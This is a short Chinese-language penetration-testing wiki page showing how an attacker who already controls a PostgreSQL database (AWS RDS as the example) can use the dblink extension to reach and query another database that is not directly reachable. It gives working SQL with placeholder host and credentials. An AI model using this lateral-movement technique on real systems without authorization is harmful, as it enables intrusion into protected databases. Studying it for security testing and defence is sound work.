---
title: PostgreSQL 数据库 SSRF
---
<center><h1>PostgreSQL 数据库 SSRF</h1></center>

---

如果获得了 PostgreSQL 数据库权限，可以通过 PostgreSQL 中的 dblink 插件横向到其他同网段数据库，这里以 AWS RDS 为例。

这里假设已经得到了一个 PostgreSQL 数据库权限，通过信息收集获得了另一台 PostgreSQL 数据库连接信息，但网络不通无法直接连接，这时可以尝试使用已有的这台 PostgreSQL 数据库进行连接。

```sql
create extension dblink;
select dblink_connect('test','host=x.x.x.x port=xxx user=xxx password=xxx dbname=postgres sslmode=disable');
create table t(id int);
select * from dblink_send_query('test', 'select version();');
select * from dblink_get_result('test') as t(res text);
```

</br><img width="1000" src="/img/1651979660.png"></br>

可以看到，通过当前 PostgreSQL 数据库成功连接到了另一台 PostgreSQL 数据库并成功执行了 select version(); 命令。

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2022年5月8日"
    }
  }
</script>